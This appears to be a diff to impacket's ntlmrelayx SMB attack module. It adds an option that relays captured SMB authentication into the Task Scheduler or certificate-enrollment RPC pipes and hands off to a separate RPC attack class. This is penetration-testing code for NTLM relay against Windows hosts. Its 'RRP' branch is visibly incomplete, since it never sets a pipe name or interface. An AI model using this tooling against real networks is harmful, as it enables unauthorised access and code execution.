@@ -15,7 +15,10 @@
 #   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
 #
 from impacket import LOG
+from impacket.dcerpc.v5 import tsch, icpr
+from impacket.dcerpc.v5.transport import SMBTransport, DCERPCTransport
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
+from impacket.examples.ntlmrelayx.attacks.rpcattack import ICPRRPCAttack, RPCAttack
 from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
 from impacket import smb3, smb
 from impacket.examples import serviceinstall
@@ -39,6 +42,28 @@ class SMBAttack(ProtocolAttack):
         else:
             self.__SMBConnection = SMBClient
         self.__answerTMP = bytearray()
+        self.rpc_attack_mode = self.config.rpc_attack
+        if self.rpc_attack_mode is not None:
+            if self.rpc_attack_mode == "TSCH":
+                self.pipename = r"\atsvc"
+                self.uuid = tsch.MSRPC_UUID_TSCHS
+            elif self.rpc_attack_mode == "ICPR":
+                self.pipename = r"\cert"
+                self.uuid = icpr.MSRPC_UUID_ICPR
+            elif self.rpc_attack_mode == "RRP":
+                self.pipename
+            else:
+                raise(NotImplementedError())
+            LOG.info("Creating Transport")
+            rpctransport = SMBTransport(self.__SMBConnection.getRemoteHost(), 445, filename=self.pipename, smb_connection=self.__SMBConnection)
+            dce = rpctransport.get_dce_rpc()
+            LOG.info("Connecting to RPC named pipe %s" % self.pipename)
+            dce.connect()
+            dce.bind(self.uuid)
+            self.rpc_attack = RPCAttack(config, dce, username)
+            self.rpc_attack.endpoint = self.rpc_attack_mode
+            return
+
         if self.config.interactive:
             #Launch locally listening interactive shell
             self.tcpshell = TcpShell()
@@ -52,6 +77,11 @@ class SMBAttack(ProtocolAttack):
 
     def run(self):
         # Here PUT YOUR CODE!
+        if self.rpc_attack_mode is not None:
+            LOG.info("Running RPC attack %s" % self.rpc_attack_mode)
+            self.rpc_attack.run()
+            return
+
         if self.tcpshell is not None:
             LOG.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)
             #Start listening and launch interactive shell
